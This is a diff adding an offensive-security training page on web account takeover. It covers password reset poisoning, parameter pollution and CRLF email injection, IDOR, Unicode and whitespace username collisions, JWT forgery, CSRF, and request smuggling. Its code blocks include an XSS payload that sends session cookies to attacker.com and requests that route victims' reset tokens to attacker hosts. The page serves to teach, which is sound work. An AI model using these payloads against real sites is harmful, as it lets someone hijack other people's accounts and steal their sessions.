@@ -1,0 +1,215 @@
+---
+layout: training-page
+title: "Account Takeover — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - account-takeover
+  - password-reset
+  - idor
+  - csrf
+  - xss
+  - jwt
+  - http-request-smuggling
+page_key: "web-account-takeover"
+---
+<h1>Account Takeover</h1>
+<p>
+  Account Takeover (ATO) encompasses techniques to gain unauthorized access to another user's
+  account. Attack vectors range from password reset flaws to CSRF, XSS session theft, JWT
+  manipulation, HTTP request smuggling, and Unicode normalization bypasses.
+</p>
+
+<h2>Password Reset Feature Attacks</h2>
+
+<h3>Password Reset Token Leak via Referrer</h3>
+<p>
+  If the password reset link includes the token in the URL, clicking an external link from the
+  reset page may leak the token in the <code>Referer</code> header to a third-party server.
+</p>
+<ol>
+  <li>Request a password reset for your own account</li>
+  <li>Click the reset link in the email</li>
+  <li>Do NOT change the password yet</li>
+  <li>Click a third-party link on the page (social media widget, external image, script)</li>
+  <li>Intercept in Burp and check the <code>Referer</code> header for the token</li>
+</ol>
+
+<h3>Host Header Poisoning (Password Reset Poisoning)</h3>
+<p>
+  Many password reset implementations generate the reset URL based on the <code>Host</code> header.
+  If the server trusts user-supplied headers, the attacker can redirect the token to their own domain.
+</p>
+<pre><code>POST /reset-password HTTP/1.1
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+Content-Type: application/json
+
+{"email":"victim@example.com"}</code></pre>
+<p>
+  The victim receives an email with a reset link pointing to <code>attacker.com</code>. When they
+  click it, the token is sent to the attacker's server.
+</p>
+<pre><code># Headers to try:
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+X-Host: attacker.com
+X-Forwarded-Server: attacker.com</code></pre>
+
+<h3>Email Parameter Manipulation</h3>
+<p>
+  The reset email can be duplicated or redirected by injecting additional email recipients through
+  parameter pollution, arrays, or header injection.
+</p>
+<pre><code># HTTP parameter pollution:
+email=victim@mail.com&amp;email=hacker@mail.com
+
+# JSON array:
+{"email":["victim@mail.com","hacker@mail.com"]}
+
+# Carbon copy injection via URL encoding:
+email=victim@mail.com%0A%0Dcc:hacker@mail.com
+email=victim@mail.com%0A%0Dbcc:hacker@mail.com
+
+# Separator variations:
+email=victim@mail.com,hacker@mail.com
+email=victim@mail.com%20hacker@mail.com
+email=victim@mail.com|hacker@mail.com</code></pre>
+
+<h3>IDOR on Password Change API</h3>
+<p>
+  Change password endpoints often accept a user identifier (ID, email) as a parameter. Substituting
+  another user's identifier changes their password.
+</p>
+<pre><code>POST /api/changepass HTTP/1.1
+Authorization: Bearer &lt;attacker_token&gt;
+Content-Type: application/json
+
+{"email":"victim@example.com","password":"NewPassword123!"}</code></pre>
+
+<h3>Weak Password Reset Tokens</h3>
+<p>
+  Test whether the reset token is predictable or short. Vulnerable patterns include:
+</p>
+<ul>
+  <li>Timestamp-based tokens (predictable within a time window)</li>
+  <li>Tokens derived from userID + email + date of birth</li>
+  <li>Short tokens (fewer than 6 characters in [A-Za-z0-9] — brute-forceable)</li>
+  <li>Tokens that don't expire or can be reused</li>
+  <li>Cryptographically weak PRNG seeded with guessable values</li>
+</ul>
+
+<h3>Token Leakage in Server Response</h3>
+<pre><code># Trigger a password reset and inspect the API response body:
+POST /api/v3/user/password/reset HTTP/1.1
+{"email":"target@example.com"}
+
+# Response might contain:
+{"status":"sent","resetToken":"abc123def456"}
+
+# Use the token directly:
+GET /v3/user/password/reset?resetToken=abc123def456&amp;email=target@example.com HTTP/1.1</code></pre>
+
+<h3>Username Collision Attack</h3>
+<p>
+  Register a new account with the target's username padded with whitespace (e.g., <code>"admin "</code>).
+  Request a password reset using this account. The reset token is sent to the attacker's email.
+  Some systems strip whitespace when validating the username, causing the reset to apply to the
+  original <code>"admin"</code> account. (CVE-2020-7245, CTFd platform)
+</p>
+<pre><code># Registration:
+username: "admin "   (trailing space)
+email:    attacker@evil.com
+
+# Request reset:
+POST /reset {"username":"admin "}
+
+# Token arrives at attacker@evil.com
+# Set new password for "admin" (after whitespace normalization)</code></pre>
+
+<h3>Unicode Normalization Bypass</h3>
+<p>
+  Some platforms normalize Unicode characters during login but not during registration. Registering
+  with a Unicode lookalike email allows stealing account access.
+</p>
+<pre><code># Victim account:
+demo@gmail.com
+
+# Attacker registers:
+demⓞ@gmail.com   (Unicode character ⓞ U+24DE)
+
+# If the platform normalizes ⓞ → o during login, the attacker account
+# can request a reset for demo@gmail.com and authenticate as the victim</code></pre>
+<p>
+  Tools: <code>github.com/tomnomnom/hacks/tree/master/unisub</code> (suggest Unicode homoglyphs),
+  <code>gosecure.github.io/unicode-pentester-cheatsheet/</code>
+</p>
+
+<h2>Account Takeover via Web Vulnerabilities</h2>
+
+<h3>Via Cross-Site Scripting (XSS)</h3>
+<ol>
+  <li>Find XSS in the target application or any subdomain sharing the cookie scope (<code>*.domain.com</code>)</li>
+  <li>Use the XSS to exfiltrate the victim's session cookie</li>
+  <li>Authenticate with the stolen cookie</li>
+</ol>
+<pre><code># Session cookie theft payload:
+&lt;script&gt;
+  fetch('https://attacker.com/steal?c=' + document.cookie, {mode:'no-cors'});
+&lt;/script&gt;</code></pre>
+
+<h3>Via HTTP Request Smuggling</h3>
+<p>
+  HTTP Request Smuggling can be used to capture another user's request (including their
+  Authorization or Cookie headers) by smuggling a partial request that prepends to the next
+  victim's legitimate request.
+</p>
+<pre><code># Step 1: find CL.TE or TE.CL desync with smuggler tool
+git clone https://github.com/defparam/smuggler.git
+cd smuggler
+python3 smuggler.py -u https://target.com
+
+# Step 2: smuggle a request that captures the next user's headers
+GET / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 83
+
+0
+
+GET http://attacker.burpcollaborator.net HTTP/1.1
+X: X</code></pre>
+
+<h3>Via CSRF</h3>
+<pre><code>&lt;!-- Auto-submitting CSRF form to change victim's email --&gt;
+&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="https://target.com/account/change-email" method="POST"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<h3>Via JWT Manipulation</h3>
+<pre><code># Decode the JWT (base64):
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOjEyMywiZW1haWwiOiJ1c2VyQGV4YW1wbGUuY29tIn0...
+
+# Modify claims:
+{"userid":1,"email":"admin@example.com"}
+
+# Attacks:
+# 1. Change alg to "none" and strip signature
+# 2. Use a weak/empty secret for HMAC signing
+# 3. Confusion: if RS256, try using the public key as HS256 secret
+# 4. Modify sub/user_id/email claim to target user</code></pre>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings Account Takeover — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover</code></li>
+  <li>10 Password Reset Flaws — Anugrah SR</li>
+  <li>CVE-2020-7245 — CTFd username collision — <code>nvd.nist.gov/vuln/detail/CVE-2020-7245</code></li>
+  <li>Hacking Grindr Accounts with Copy and Paste — Troy Hunt (Unicode normalization)</li>
+  <li>smuggler tool — <code>github.com/defparam/smuggler</code></li>
+  <li>HackerOne #737140 — HTTP Request Smuggling ATO on Slack</li>
+  <li>Unicode Pentester Cheatsheet — <code>gosecure.github.io/unicode-pentester-cheatsheet/</code></li>
+  <li>unisub tool — <code>github.com/tomnomnom/hacks/tree/master/unisub</code></li>
+</ul>
